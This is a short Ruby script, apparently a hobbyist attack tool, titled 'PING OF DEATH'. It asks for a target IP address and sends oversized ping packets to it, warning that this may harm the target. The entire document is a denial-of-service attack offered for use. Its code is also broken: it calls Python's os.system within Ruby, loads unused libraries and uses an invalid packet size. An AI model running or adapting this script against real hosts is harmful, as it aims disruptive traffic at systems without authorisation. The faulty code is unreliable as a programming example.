#REQUIREMENTS 
#encoding: utf-8
require 'socket'
require 'net/ping'
require 'timeout'


#BODY
system("clear")
puts "PING OF DEATH"
puts "\n"
puts "\n"
puts "WARNING THIS MAY HARM THE TARGET"
print "TARGET IP:"
ip = gets.chomp

#send ping
os.system("ping -l 65510 #{ip}")
puts "SENDING MORE PACKETS..."
os.system("ping -l 100000 #{ip}")
puts "DONE."
